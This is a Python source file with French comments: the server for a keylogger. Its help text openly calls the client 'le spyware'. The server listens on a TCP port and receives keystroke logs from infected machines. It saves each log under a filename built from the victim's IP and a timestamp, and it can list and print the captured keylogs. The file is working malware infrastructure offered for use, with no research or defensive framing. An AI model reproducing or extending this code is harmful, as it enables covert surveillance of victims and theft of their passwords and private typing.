import socket
import os
import sys

from datetime import datetime

def receive_file(filename, client_socket, destination_folder):
    full_path = os.path.join(destination_folder, filename)
    with open(full_path, 'wb') as file:
        while True:
            keylog = client_socket.recv(1024)
            if not keylog  :
                break
            file.write(keylog)


def show_files():
    files = os.listdir("Keylogs")
    if files:
        print("Keylogs actuels :")
        for file in files:
            print(file)
    else:
        print("Pas de fichiers actuellement.")
    sys.exit()

def read_file(filename):
    filepath = os.path.join("Keylogs", filename)
    try:
        with open(filepath, "r") as file:
            content = file.read()
            print(f"Contenu de {filename}:")
            print(content)
    except FileNotFoundError:
        print(f"Le fichier {filename} n'existe pas.")
    sys.exit()

def listen_port(number):
    server_port = number  
    save_folder = "Keylogs"  

    # Création du répertoire de sauvegarde
    if not os.path.exists(save_folder):
        os.makedirs(save_folder)

    # Création d'un socket serveur
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        # Rendre le socket non bloquant
        server_socket.setblocking(0)
        # Liaison du socket à l'adresse et au port souhaité
        server_socket.bind(('', server_port))

        # Écoute des connexions entrantes
        server_socket.listen(5)
        print(f"Le serveur est prêt à écouter les connexions entrantes sur le port {server_port} .")

        try:
            while True:
                try:
                    client_socket, client_address = server_socket.accept()
                except BlockingIOError:
                    pass
                else:
                    # IP du client
                    client_ip = client_address[0]

                    # Heure actuelle
                    heure_actuelle = datetime.now()
                    # Formatage de l'heure actuelle
                    heure_formattee = heure_actuelle.strftime("%Y-%m-%d_%H-%M-%S")
                    # Remplacement des caractères non valides dans le nom du fichier
                    heure_formattee = heure_formattee.replace(":", "-").replace(" ", "/")

                    print("Nouvelle connexion entrante:", client_address)

                    # Réception du fichier envoyé par le client
                    filename = f"{client_ip}-{heure_formattee}-keyboard.txt"
                    receive_file(filename, client_socket, save_folder)

                    print("Fichier reçu et enregistré avec succès:", filename)

        except KeyboardInterrupt:
            print("Arrêt du serveur.")


def help_option():
    if "-h" in sys.argv or "--help" in sys.argv:
        print("-l/--listen se met en écoute sur le port TCP saisi par l'utilisateur et attend les données du spyware.\n"
              "-s/--show affiche la liste des fichiers réceptionnés par le programme.\n"
              "-r/--readfile <nom_fichier> affiche le contenu du fichier stocké sur le serveur du spyware.\n"
              "-k/--kill arrête toute les instances de serveurs en cours, avertit le spyware de s'arrêter et de supprimer la capture.")
        sys.exit()

if "-s" in sys.argv or "--show" in sys.argv:
    show_files()

if "-r" in sys.argv or "--readfile" in sys.argv:
    try:
        file_index = sys.argv.index("-r") if "-r" in sys.argv else sys.argv.index("--readfile")
        filename = sys.argv[file_index + 1]
        read_file(filename)
    except IndexError:
        print("Erreur: Veuillez fournir le nom du fichier à lire après l'option -r/--readfile.")
        sys.exit()

if "-l" in sys.argv or "--listen" in sys.argv:
    try:
        port_index = sys.argv.index("-l") if "-l" in sys.argv else sys.argv.index("--listen")
        port = int(sys.argv[port_index + 1])
        listen_port(port)
    except (ValueError, IndexError):
        print("Erreur: Veuillez fournir le numéro du port à écouter après l'option -l/--listen.")
        sys.exit()

help_option()